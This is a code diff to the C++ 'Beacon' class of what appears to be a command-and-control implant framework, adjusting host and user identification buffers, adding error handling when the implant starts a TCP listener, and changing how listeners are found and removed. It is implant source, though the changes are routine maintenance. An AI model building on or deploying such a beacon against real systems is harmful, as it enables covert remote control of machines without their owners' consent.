@@ -111,10 +111,10 @@ Beacon::Beacon(const std::string& ip, int port)
 
 #ifdef __linux__
 
-	char hostname[HOST_NAME_MAX];
-	char username[LOGIN_NAME_MAX];
-	gethostname(hostname, HOST_NAME_MAX);
-	getlogin_r(username, LOGIN_NAME_MAX);
+	char hostname[2048];
+	char username[2048];
+	gethostname(hostname, 2048);
+	getlogin_r(username, 2048);
 
 	m_hostname = hostname;
 	m_username = username;
@@ -462,6 +462,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		std::string delimiter = " ";
 		splitList(cmd, delimiter, splitedCmd);
 
+		// TODO handle error for other type of listener
 		if(splitedCmd[0]==StartCmd)
 		{
 			if(splitedCmd[1]==ListenerSmbType)
@@ -516,15 +517,21 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 				}
 				else
 				{
-					// TODO fail ??
 					std::unique_ptr<ListenerTcp> listenerTcp = make_unique<ListenerTcp>(localHost, localPort);
-					std::string listenerHash = listenerTcp->getListenerHash();
-					m_listeners.push_back(std::move(listenerTcp));
-
-					// Respond with the listener hash
-					c2RetMessage.set_cmd(cmd);
-					c2RetMessage.set_returnvalue(listenerHash);
-					return false;
+					int ret = listenerTcp->init();
+					if (ret>0)
+					{
+						std::string listenerHash = listenerTcp->getListenerHash();
+						m_listeners.push_back(std::move(listenerTcp));
+						c2RetMessage.set_cmd(cmd);
+						c2RetMessage.set_returnvalue(listenerHash);
+						return false;
+					} 
+					else 
+					{
+						c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
+						return false;
+					}										
 				}
 			}
 		}
@@ -534,14 +541,19 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 			std::vector<unique_ptr<Listener>>::iterator object = 
 				find_if(m_listeners.begin(), m_listeners.end(),
-						[&](unique_ptr<Listener> & obj){ return obj->getListenerHash() == listenerHash;}
+						[&](unique_ptr<Listener> & obj){ return obj->getListenerHash().rfind(listenerHash,0)==0;}
 						);
 
 			if(object!=m_listeners.end())
 			{
-				m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
 				c2RetMessage.set_cmd(cmd);
-				c2RetMessage.set_returnvalue(listenerHash);
+				c2RetMessage.set_returnvalue((*object)->getListenerHash());
+
+				std::cout << "Listener found" << std::endl;
+				m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
+
+				std::cout << "erase" << std::endl;
+				
 				return false;
 			}
 			else 
